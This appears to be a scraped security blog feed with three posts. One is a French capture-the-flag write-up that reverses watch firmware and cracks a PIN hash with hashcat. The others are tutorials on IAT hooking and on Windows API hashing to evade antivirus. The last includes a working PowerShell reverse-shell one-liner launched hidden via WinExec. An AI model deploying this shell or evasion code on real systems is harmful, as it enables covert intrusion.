(0.03)\r0x1fff8000 (0.01)\r0x46bfa000 (0.00)\r0x001fb000 (0.00) Cet outil nous apprend que les octets dans le firmware sont en little endian et nous propose des addresse de bases afin de mapper correctement notre binaire.\nOn est donc maintenant prêt à charger notre firmware dans Ghidra.\nUne fois notre binaire chargé on va aller dans Window -\u0026gt; Memory Map et cliquer sur la petite maison afin de modifier l\u0026rsquo;addresse de base du binaire.\net l\u0026rsquo;on va la mettre à 0x2000. A ce moment là vous vous rendrez compte que ghidra vous a maintenant trouvé plein de fonctions. En effet, grâce à l\u0026rsquo;addresse de base les fonctions ainsi que les symboles présents dans le binaire vont pouvoir être résolus par notre désassembleur car ils seront à leur addresse correcte. Je vous conseille tout de même de lancer à nouveau une auto-analyse du firmware ainsi qu\u0026rsquo;un \u0026ldquo;ARM agressive instruction finder\u0026rdquo;.\nCommençons donc à investiguer.\nPour ma part j\u0026rsquo;ai d\u0026rsquo;abord commencé par regarder les chaines de caractères présentes dans le binaire. Certaines telles que \u0026ldquo;BADPIN\u0026rdquo;, \u0026ldquo;PI N%c%c%c%c%c%c\u0026rdquo;\nA la suite de ça on peut trouver les fonctions qui utilise ces chaines de caractère.\nOn trouve cette fonction qui fait reference à la chaine \u0026ldquo;BADPIN\u0026rdquo; :\nundefined8 UndefinedFunction_0000b308(uint param_1,uint param_2,char *param_3) { int iVar1; undefined *puVar2; char cVar3; char extraout_r1; int extraout_r1_00; int iVar4; uint uStack_14; iVar1 = DAT_0000b3fc; uStack_14 = param_2 \u0026amp; 0xffff0000 | param_1 \u0026amp; 0xffff; switch(param_1 \u0026amp; 0xff) { case 1: if (*param_3 != \u0026#39;\\0\u0026#39;) break; goto LAB_0000b376; case 2: cVar3 = *param_3; if (cVar3 == \u0026#39;\\0\u0026#39;) { if ((int)((uStack_14 \u0026gt;\u0026gt; 8) \u0026lt;\u0026lt; 0x1f) \u0026lt; 0) { cVar3 = param_3[2] + \u0026#39;\\x04\u0026#39;; puVar2 = DAT_0000b3f8; LAB_0000b340: FUN_00005a84(puVar2,cVar3); break; } } else if (cVar3 == \u0026#39;\\x01\u0026#39;) { FUN_00006a88(param_3 + 3,6,DAT_0000b3fc,0); iVar4 = 0; do { if (PTR_DAT_0000b400[iVar4] != (*(byte *)(iVar1 + iVar4) ^ 0x15)) { cVar3 = \u0026#39;\\0\u0026#39;; goto LAB_0000b370; } iVar4 = iVar4 + 1; } while (iVar4 != 0x40); cVar3 = \u0026#39;\\x01\u0026#39;; LAB_0000b370: *param_3 = \u0026#39;\\x03\u0026#39; - cVar3; } else { if (cVar3 != \u0026#39;\\x03\u0026#39;) { if (cVar3 != \u0026#39;\\x02\u0026#39;) break; cVar3 = \u0026#39;\\0\u0026#39;; puVar2 = PTR_DAT_0000b408; goto LAB_0000b340; } FUN_0000e31c(param_3 + 3,PTR_s_BADPIN_0000b404); param_3[1] = \u0026#39;\\0\u0026#39;; param_3[2] = \u0026#39;\\0\u0026#39;; } LAB_0000b376: FUN_0000b29c(param_3); break; default: FUN_0000a700(uStack_14); break; case 5: FUN_0000a6c4(0); break; case 6: if (*param_3 == \u0026#39;\\0\u0026#39;) { if ((byte)param_3[2] == 5) { *param_3 = \u0026#39;\\x01\u0026#39;; } FUN_0000b744((byte)param_3[2] + 1,6); param_3[2] = extraout_r1; param_3[1] = \u0026#39;\\0\u0026#39;; } break; case 0xe: if (*param_3 == \u0026#39;\\0\u0026#39;) { FUN_0000b744((byte)param_3[1] + 1,10); puVar2 = PTR_s_0123456789_0000b40c; param_3[1] = (char)extraout_r1_00; param_3[(byte)param_3[2] + 3] = puVar2[extraout_r1_00]; } } return CONCAT44(param_1,1); } Malheureusement elle n\u0026rsquo;est pas très compréhensible.\nSachant que nous avons une partie du code source de notre firmware, nous pouvons nous en servir afin de retrouver des symboles.\nJ\u0026rsquo;ai donc procédé de la même manière suivante, pour chaque fonctions présentes dans le code source de la Sensor-Watch et en particulier du framework movement, je modifie le nom de la fonction.\nQuelques exemples de fonctions que j\u0026rsquo;ai utilisé sont :\napp_init\napp_loop\nfile_system_init\nfilesystem_process_command\nfile_system_write_file\n\u0026hellip;\nGrâce à cela, j\u0026rsquo;ai pu retrouver plusieurs symboles et avoir une meilleure compréhension de notre fonction.\nLa documentation de Movement fût également d\u0026rsquo;une grande aide :\nSensor-Watch/README.md at main · joeycastillo/Sensor-Watch · GitHub\nOn comprend donc que le code trouvé précedemment équivaut à la fonction face_loop\nEn s\u0026rsquo;aidant de cette page de documentation, de quelques exemples présent sur le github ainsi que des symboles que l\u0026rsquo;on a résolu je réussis à réécrire un code un peu plus compréhensible.\nundefined8 face_loop(event_type event,astruct_1 *param_2,struct_context *context) { undefined *puVar1; char cVar2; uchar extraout_r1; int extraout_r1_00; int iVar3; uint local_14; int state; buffer = DAT_0000b3fc; local_14 = (uint)param_2 \u0026amp; 0xffff0000 | (uint)(ushort)event; switch(event.event_type) { case \u0026#39;\\x01\u0026#39;: if (context-\u0026gt;action != \u0026#39;\\0\u0026#39;) break; goto LAB_0000b376; case \u0026#39;\\x02\u0026#39;: /* si context-\u0026gt; action n\u0026#39;est pas égal à 0 on va appeler */ cVar2 = context-\u0026gt;action; if (cVar2 == \u0026#39;\\0\u0026#39;) { if ((int)((local_14 \u0026gt;\u0026gt; 8) \u0026lt;\u0026lt; 0x1f) \u0026lt; 0) { cVar2 = context-\u0026gt;index + \u0026#39;\\x04\u0026#39;; puVar1 = DAT_0000b3f8; LAB_0000b340: watch_display_string(puVar1,cVar2); break; } } else if (cVar2 == \u0026#39;\\x01\u0026#39;) { /* on dirait qu\u0026#39;il va mettre des données à l\u0026#39;adresse de DAT_0000b3fc et va ensuite itérer dessus en faisait un xor 0x15 sur chaque valeur à cette addresse et la comparer avec des valeurs d\u0026#39;une array de 64 bytes */ unknow_function(context-\u0026gt;PIN,6,DAT_0000b3fc,0); iVar3 = 0; do { if (PTR_DAT_0000b400[iVar3] != (*(byte *)(state + iVar3) ^ 0x15)) { cVar2 = \u0026#39;\\0\u0026#39;; goto LAB_0000b370; } iVar3 = iVar3 + 1; } while (iVar3 != 0x40); cVar2 = \u0026#39;\\x01\u0026#39;; LAB_0000b370: context-\u0026gt;action = \u0026#39;\\x03\u0026#39; - cVar2; } else { if (cVar2 != \u0026#39;\\x03\u0026#39;) { if (cVar2 != \u0026#39;\\x02\u0026#39;) break; cVar2 = \u0026#39;\\0\u0026#39;; puVar1 = FCSC; goto LAB_0000b340; } maybe_print(context-\u0026gt;PIN,PTR_s_BADPIN_0000b404); context-\u0026gt;ticks = \u0026#39;\\0\u0026#39;; context-\u0026gt;index = \u0026#39;\\0\u0026#39;; } LAB_0000b376: update_cadran(context); break; default: movement_default_loop_handler(local_14); break; case \u0026#39;\\x05\u0026#39;: FUN_0000a6c4(0); break; case \u0026#39;\\x06\u0026#39;: /* bouton en haut à gauche de la montre, on incrémente notre index et si il est égal à 5 on passe context à 1 */ if (context-\u0026gt;action == \u0026#39;\\0\u0026#39;) { if (context-\u0026gt;index == 5) { context-\u0026gt;action = \u0026#39;\\x01\u0026#39;; } FUN_0000b744(context-\u0026gt;index + 1,6); context-\u0026gt;index = extraout_r1; context-\u0026gt;ticks = \u0026#39;\\0\u0026#39;; } break; case \u0026#39;\\x0e\u0026#39;: if (context-\u0026gt;action == \u0026#39;\\0\u0026#39;) { /* incremente le password à la position password[param[2]] (bouton en bas à droite) */ FUN_0000b744(context-\u0026gt;ticks + 1,10); puVar1 = PTR_s_0123456789_0000b40c; /* PTR_s_0123456789_0000b40c pointe vers \u0026#34;0123456789\u0026#34; */ context-\u0026gt;ticks = (uchar)extraout_r1_00; context-\u0026gt;PIN[context-\u0026gt;index] = puVar1[extraout_r1_00]; } } return CONCAT44((uint)(ushort)event,1); } J\u0026rsquo;ai aussi réimplémenter les structures suivantes :\nstruct struct_context { uint8 ticks; uint8 index; char PIN[6] } struct event_type { uint8 no_idea; uint8 event; } la structure contexte contient le code PIN entré ainsi que l\u0026rsquo;index du code PIN que l\u0026rsquo;on est actuellement en train de modifier.\nLa structure event contient l\u0026rsquo;action réalisé par l\u0026rsquo;utilisateur.\nA partir de là, le code reste plutôt sale mais j\u0026rsquo;espère que vous le comprendrez aussi grâce à mes commentaires.\nA partir de là une chose était sure pour moi. Il fallait qu\u0026rsquo;une fois unknow_function était appelée avec en paramètre notre PIN ainsi que sa taille DAT_0000b3fc soit égal au 64 bytes présent à l\u0026rsquo;addresse PTR_DAT_0000b400 xor par 15.\nJe me suis donc mis à reverse la fonction unknow function pendant un très long moment sans comprendre son fonctionnement.\nPuis une idée m\u0026rsquo;est venue, googler les constantes ! Et effectivemment on tombe rapidemment sur des liens parlant de sha512.\nA ce moment là, tout deviens plus clair. En effet la taille d\u0026rsquo;un hash sha512 est de 64 bytes ! On cherche donc un peu et on retrouve dans le code source de la Sensor Watch notre fonction de hashage.\nJe récupère donc le tableau de 64 bytes\n[ 0xe3, 0x1e, 0x2c, 0x61, 0x36, 0xbd, 0xa8, 0xc0, 0x53, 0xf0, 0xf4, 0x45, 0x91, 0x88, 0x0b, 0xa7, 0x86, 0x39, 0x35, 0xd8, 0xb3, 0xc9, 0x7a, 0x3c, 0xca, 0xdf, 0xdd, 0xc2, 0xb3, 0x68, 0x97, 0xe8, 0x6c, 0x17, 0xd7, 0x97, 0x60, 0x1a, 0x3c, 0xda, 0xa6, 0xb8, 0x24, 0xd3, 0xb9, 0xac, 0xe6, 0xec, 0xac, 0xac, 0x55, 0xfd, 0x49, 0xaf, 0x5d, 0xaa, 0x44, 0x4f, 0x8f, 0x3e, 0x7d, 0xf5, 0xf2, 0xa7 ] que je xor par 0x15 afin d\u0026rsquo;obtenir le hash suivant :\nf60b397423a8bdd546e5e150849d1eb2932c20cda6dc6f29dfcac8d7a67d82fd7902c282750f29cfb3ad31c6acb9f3f9b9b940e85cba48bf515a9a2b68e0e7b2 Nous savons que notre code PIN à une taille de 6 caractère et nous avons \u0026ldquo;0123456\u0026rdquo; comme set de caractère. On pourra donc très facilement casser ce mot de passe.\nPour ce faire j\u0026rsquo;ai utilisé hashcat :\n.\\hashcat.exe -m 1700 -a 3 f60b397423a8bdd546e5e150849d1eb2932c20cda6dc6f29dfcac8d7a67d82fd7902c282750f29cfb3ad31c6acb9f3f9b9b940e85cba48bf515a9a2b68e0e7b2 ?d?d?d?d?d?d Et nous obtenons un code pin qui est 413372 !!\nOn peut donc maintenant l\u0026rsquo;essayer dans notre émulateur et obtenir le flag.\nLe flag est donc FCSC413372 !\nConclusion C\u0026rsquo;était la première fois que je reversais un firmware et malgré beaucoup de difficultés au début j\u0026rsquo;ai apprécié ce challenge. Si je devais en retenir quelque chose ce serait prendre le temps de comprendre le firmware afin de configurer correctement son désassembleur. J\u0026rsquo;ai en effet l\u0026rsquo;habitude de reverse des binaires très communs tels que des ELF, PE, etc. qui sont très bien pris en charges par les désassembleurs. Ce fut un challenge très enrichissant, un grand merci aux créateurs.\n","permalink":"https://trikkss.github.io/posts/fcsc2023_Sensor-Watch/","summary":"Write up du challenge Sensor Watch.","title":"FCSC 2023 - Sensor Watch"},{"content":"Import Table When you run a Portable Executable (PE), before the execution of our program, libraries will be loaded in memory and their function addresses will be referenced in the Import Address Table (IAT). When a program calls a function from a DLL, it calls the address located in the IAT wich point to the function in memory.\ndiagram of a normal api call :\ndiagram of an hooked api call :\nWe want to change the address of this API call in the IAT to execute an non intended function. This technique can be useful for reverse engineer to change the result of a function or dump his parameter (for example if you have a runPE you can hook the WriteProcessMemory function and easily dump the PE.) and it can be useful for malware devellopers to hide some malicious code.\nImport table structure You can learn more about the import table here.\nThe import table is a null terminated array a null terminated array of IMAGE_IMPORT_DESCRIPTOR structure.\ntypedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; } DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; DWORD FirstThunk; } IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; Each dll in the Import Table as an IMAGE_IMPORT_DESCRIPTOR structure which contains information about it like its name, its functions, etc.\nHere we will focus only on interesting things for us.\nDWORD Name : RVA of an ASCII string that contains the name of the module (dll name)\nDWORD OriginalFirstThunk : RVA of the Import Lookup Table (ILT)\nDWORD FirstThunk : RVA of the Import Address Table (IAT)\nRelative Virtual Address (RVA) means Relative to the base address.\nExample : dll_name = PE_Base_Address + IMAGE_IMPORT_DESCRIPTOR.Name\nOriginalFirstThunk and FirstThunk The IAT and ILT are parallel\u0026rsquo;s NULL terminated arrays.\nTheir structure is defined as it :\ntypedef struct _IMAGE_THUNK_DATA { union { uint32_t* Function; // address of imported function uint32_t Ordinal; // ordinal value of function PIMAGE_IMPORT_BY_NAME AddressOfData; // RVA of imported name DWORD ForwarderStringl // RVA to forwarder string } u1; } IMAGE_THUNK_DATA, *PIMAGE_THUNK_DATA; Import Lookup Table The ILT contain names and ordinals for each API call.\nif the first bit of AddressOfData is 1, this DWORD is the ordinal of the function to import.\nElse, the AddressOfData point to a IMAGE_IMPORT_BY_NAME structure which contains the API call name and looks like this :\ntypedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; BYTE Name[1]; /*The BYTE designated at Name of course only marks the beginning of the character array of the imported function name as the name can be larger than one character.*/ } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; Import Address Table The IAT contain virtual address of these API calls.\nParsing the import table Now, we have to parse our PE to find it\u0026rsquo;s Import Table. To do that we will use the winnt.h library in C.\nThe following diagram illustrate the simplified structure of a PE.\nWe first have to retrieve the base address of our PE. To do it we can call the GetModuleHandle() API call.\nGetModuleHandle(NULL)\nNow, like my previous article about API Windows Hashing, we will parse the PE.\nHANDLE PE_base = GetModuleHandle(NULL); IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) PE_base; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)PE_base + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header // RVA of the import table can be found in the optional headers // https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-data-directories-image-only // https://0xrick.github.io/win-internals/pe6/#import-directory-table IMAGE_IMPORT_DESCRIPTOR* import_table = (IMAGE_IMPORT_DESCRIPTOR*)((LPBYTE)PE_base + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); Here we retrieve the address of the first IMAGE_IMPORT_DESCRIPTOR array.\nwe can easily iterate trought the null terminated array using a while loop :\nwhile (import_table-\u0026gt;Name != 0) { // print each dll loaded in the import table printf(\u0026#34;%s\\n\u0026#34;, (char*)((LPBYTE)PE_base + import_table-\u0026gt;Name)); } Now, we want for each DLLs to retrieve their functions name and address. We first have to find our ILT and IAT and iterate throught it.\nIMAGE_THUNK_DATA* lookup_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;OriginalFirstThunk); IMAGE_THUNK_DATA* address_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;FirstThunk); // it will print all function name of the module. while(lookup_table-\u0026gt;u1.AddressOfData != 0) { // check if its an import by ordinal if((lookup_table-\u0026gt;u1.AddressOfData \u0026amp; IMAGE_ORDINAL_FLAG) == 0) { // retrieve the struct wich contains the function name IMAGE_IMPORT_BY_NAME* lookup_addr = (IMAGE_IMPORT_BY_NAME*)((LPBYTE)PE_base + lookup_table-\u0026gt;u1.AddressOfData); printf(\u0026#34;%s\\n\u0026#34;, (char*)lookup_addr-\u0026gt;Name); } lookup_table++; address_table++; } Now we can print a function\u0026rsquo;s address from its name, like MessageBoxA as below:\n// we want to print the address of the MessageBoxA API call. if(strcmp(lookup_addr-\u0026gt;Name, \u0026#34;MessageBoxA\u0026#34;) == 0) { printf(\u0026#34;%p\\n\u0026#34;, address_table-\u0026gt;u1.Function); // print the function address } Okay, now we have the address of the API call we want to hook.\nThe complete function to print it looks like this :\nvoid print_address_by_parsing_IAT(HMODULE PE_base, char* function_to_hook) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) PE_base; IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)PE_base + p_DOS_HDR-\u0026gt;e_lfanew ); IMAGE_IMPORT_DESCRIPTOR* import_table = (IMAGE_IMPORT_DESCRIPTOR*)((LPBYTE)PE_base + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // iterate throught the null terminated modules array while (import_table-\u0026gt;Name != 0) { // retrieve ILT and IAT IMAGE_THUNK_DATA* lookup_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;OriginalFirstThunk); IMAGE_THUNK_DATA* address_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;FirstThunk); // iterate throught IAT and ILT while(lookup_table-\u0026gt;u1.AddressOfData != 0) { // check if the function is called by ordinal if((lookup_table-\u0026gt;u1.AddressOfData \u0026amp; IMAGE_ORDINAL_FLAG) == 0) { // if it is not retrieve its IMAGE_IMPORT_BY_NAME structure IMAGE_IMPORT_BY_NAME* lookup_addr = (IMAGE_IMPORT_BY_NAME*)((LPBYTE)PE_base + lookup_table-\u0026gt;u1.AddressOfData); // compare the function name with the function name to hook if(strcmp(lookup_addr-\u0026gt;Name, function_to_hook) == 0) { printf(\u0026#34;%p\\n\u0026#34;, address_table-\u0026gt;u1.Function); } } // next element of the IAT and the ILT lookup_table++; address_table++; } // next module import_table++; } } So, this function will just print the API call address. Now we have to change it.\nHooking the API call Lets make a fake MessageBox :\nINT WINAPI fake_messagebox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType){ printf(\u0026#34;I hooked your function :)\\n\u0026#34;); printf(\u0026#34;you wanted to display %s\\n\u0026#34;, lpText); return 0; } Instead of printing the MessageBoxA address in the IAT, we will overwrite it by fake_messagebox address and save the real MessageBox address into an other variable.\naddress_table-\u0026gt;u1.Function = (ULONGLONG)fake_messagebox;\nOur final code look like this.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; typedef int(WINAPI* MESSAGE_BOX_TYPE)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType); MESSAGE_BOX_TYPE MessageBoxSaved; INT WINAPI fake_messagebox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType){ printf(\u0026#34;I hooked your function :)\\n\u0026#34;); printf(\u0026#34;you wanted to display %s\\n\u0026#34;, lpText); return MessageBoxSaved(hWnd, lpText, lpCaption, uType); } void hook_IAT(HMODULE PE_base, char* function_to_hook) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) PE_base; IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)PE_base + p_DOS_HDR-\u0026gt;e_lfanew ); IMAGE_IMPORT_DESCRIPTOR* import_table = (IMAGE_IMPORT_DESCRIPTOR*)((LPBYTE)PE_base + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // iterate throught the null terminated modules array while (import_table-\u0026gt;Name != 0) { // retrieve ILT and IAT IMAGE_THUNK_DATA* lookup_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;OriginalFirstThunk); IMAGE_THUNK_DATA* address_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;FirstThunk); // iterate throught IAT and ILT while(lookup_table-\u0026gt;u1.AddressOfData != 0) { // check if the function is called by ordinal if((lookup_table-\u0026gt;u1.AddressOfData \u0026amp; IMAGE_ORDINAL_FLAG) == 0) { // if it is not retrieve its IMAGE_IMPORT_BY_NAME structure IMAGE_IMPORT_BY_NAME* lookup_addr = (IMAGE_IMPORT_BY_NAME*)((LPBYTE)PE_base + lookup_table-\u0026gt;u1.AddressOfData); // compare the function name with the function name to hook if(strcmp(lookup_addr-\u0026gt;Name, function_to_hook) == 0) { // change its address address_table-\u0026gt;u1.Function = (ULONGLONG)fake_messagebox; } } // next element of the IAT and the ILT lookup_table++; address_table++; } // next module import_table++; } } int main(void) { // save MessageBox function MessageBoxSaved = (MESSAGE_BOX_TYPE)GetProcAddress(LoadLibrary(\u0026#34;user32.dll\u0026#34;), \u0026#34;MessageBoxA\u0026#34;); // hook the function hook_IAT(GetModuleHandle(NULL), \u0026#34;MessageBoxA\u0026#34;); MessageBoxA(NULL, \u0026#34;hello world\u0026#34;, \u0026#34;simple message box\u0026#34;, MB_OK); } /* output : I hooked your function :) you wanted to display hello world */ To go further you can hook any function present in the IAT of an other process using DLL injection to execute some code which will patch the import table. It\u0026rsquo;s a bit more difficult but it can be interesting for game hacking or reverse engineering.\nIssue This technic is useful, but it can be bypassed if the program retrieve its API call address from the Export Table using the GetProcAddress() function.\nConclusion This example was basic, but I think with it you can make lot of funny things.\nI hope you enjoyed to read it, have a nice day.\n","permalink":"https://trikkss.github.io/posts/iat_hooking/","summary":"IAT hooking is a technique often used by malware developers, game hackers or reverse engineer to replace a function from the Import Table by another one.","title":"Malware - IAT Hooking"},{"content":"What is Windows API Hashing This technique is often used by malware developers to hide their calls to the windows API. That way the blue team will have more difficulty reversing the malware and it is less flagged by an AV. Our goal is to make a PE without an import table.\nThe Import Table Let\u0026rsquo;s compile a simple C program which will execute a simple reverse shell using WinExec API call. That call creates a new process and executes a system command.\n#include \u0026lt;windows.h\u0026gt; int main(void) { // execute our reverse shell WinExec(\u0026#34;powershell -nop -c \\\u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;127.0.0.1\u0026#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sb2 = $sb + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\\\u0026#34;\u0026#34;, SW_HIDE); return 0; } Before the execution of our program, libraries will be loaded in memory and their function addresses will be referenced in the Import Address Table (IAT). When a program calls a function from a DLL, it calls the address located in the IAT wich points to the function in memory.\nIf we look into our import table (I used CFF Explorer to do it) we can see several imported DLLs and our suspicious function (WinExec).\nA first way will to hide our function would be to retrieve its address at runtime using the GetProcAddress() API call.\n#include \u0026lt;windows.h\u0026gt; typedef UINT(WINAPI* winexec)(LPCSTR lpCmdLine, UINT uCmdShow); int main(void) { // get handle of kernel32.dll HMODULE kernel32_dll = GetModuleHandle(\u0026#34;kernel32.dll\u0026#34;); // parse it to find the WinExec function winexec WinExec_imported = (winexec)GetProcAddress(kernel32_dll, \u0026#34;WinExec\u0026#34;); // execute our reverse shell WinExec_imported(\u0026#34;powershell -nop -c \\\u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;127.0.0.1\u0026#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sb2 = $sb + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\\\u0026#34;\u0026#34;, SW_HIDE); return 0; } Here we retrieve the handle (the base address) of the kernel32.dll module with the GetModuleHandle() API call. Now we can use the GetProcAddress() API call to parse our DLL and return the function\u0026rsquo;s address.\nIt works, WinExec seems to be absent from our IAT. But until now it\u0026rsquo;s easy to reverse and functions like GetModuleHandle and GetProcAddress can be suspicious \u0026hellip;\nWrite our own GetProcAddress We will write our own GetProcAddress() function and instead of searching for a function name, we will search for a hash. For now this may be strange for you but don\u0026rsquo;t worry you will understand everything. First we need to understand how the export table works.\nThe Export Table An Export Adress Table (EAT) will reference all the exported functions from a dll.\nThis is what the _IMAGE_EXPORT_DIRECTORY (wich represents the export table) structure defined into the winnt.h library looks like.\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals; } IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY; Name : the module name (dll name if you want) NumberOfFunctions : number of functions available in the module NumberOfNames : because some functions do not have names AddressOfFunctions : pointer to an array of address AddressOfNames : pointer to an array list of names AddressOfNameOrdinals : pointer to an array of \u0026ldquo;ordinals\u0026rdquo; (i will explain that.) diagram from Infosec Resources\nEach function has a number associated to it. It is called an ordinal. Each function name is associated to an ordinal but a function may have no name. Functions are often imported by their names but it makes a lot of strcmp so sometimes functions are imported by ordinal. It makes reverse engineering a bit harder and functions import faster.\nSo now, we can make a \u0026ldquo;roadmap\u0026rdquo; in order to create our own GetProcAdress():\nfirst, we must parse our dll to find the export table after we have to browse the name list to find our function name get ordinal associated to this name get address function associated to this ordinal and return it Parse the dll\u0026rsquo;s to do that we will use the winnt.h library in C.\nThe following diagram illustrates the simplified structure of a PE. more about PE format : Malware researcher’s handbook (demystifying PE file) | Infosec Resources\nSo, we have to parse the DOS header first, then the NT header to access the optionnal headers and finally get the Export Address Table (located in the .edata section)\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;winnt.h\u0026gt; void* my_GetProcAddress(HMODULE dll_handle, char* hashed_function_name) { // a dll is a Portable Executable file. IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header // RVA of the export table can be found in the optional headers // https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-data-directories-image-only IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); return NULL; } Now we have the address of our export table. Let\u0026rsquo;s parse it following the EAT diagram above.\nPARSE OUR EXPORT TABLE Getting the name, ordinal and address array.\nDWORD numberOfNames = export_table-\u0026gt;NumberOfNames; // size of array name DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfFunctions); // array function DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNames); // array name WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNameOrdinals); // array ordinal let\u0026rsquo;s iterate through the array name to find our function\nfor(size_t i=0; i \u0026lt; numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; if (strcmp(hashed_function_name, name) == 0) { printf(\u0026#34;function %s found into %s !\\n\u0026#34;, name, (char*)dll_handle+export_table-\u0026gt;Name); } } This loop iterates through the name array and compares each function\u0026rsquo;s name to our string. Now we just have to return the function\u0026rsquo;s address, this is the tricky part. We have to find the ordinal attached to this function\u0026rsquo;s name.\n// these 2 arrays are parallel functions_names[i] // -\u0026gt; name (string) functions_ordinal[i] // -\u0026gt; ordinal (integer) // index of the function into the functions_address list // so we just have to do this to get the function functions_address[functions_ordinal[i]] don\u0026rsquo;t forget that these addresses are relative to the base address so we have to add base_address + address\nHere it\u0026rsquo;s the complete code of our function :\nvoid* my_GetProcAddress(HMODULE dll_handle, char* hashed_function_name) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // .edata section DWORD numberOfNames = export_table-\u0026gt;NumberOfNames; printf(\u0026#34;number of names : %d\\n\u0026#34;, numberOfNames); DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfFunctions); DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNames); WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNameOrdinals); for(size_t i=0; i \u0026lt; numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; // printf(\u0026#34;%s\\n\u0026#34;,name); if (strcmp(hashed_function_name, name) == 0) { printf(\u0026#34;function %s found into %s !\\n\u0026#34;, name, 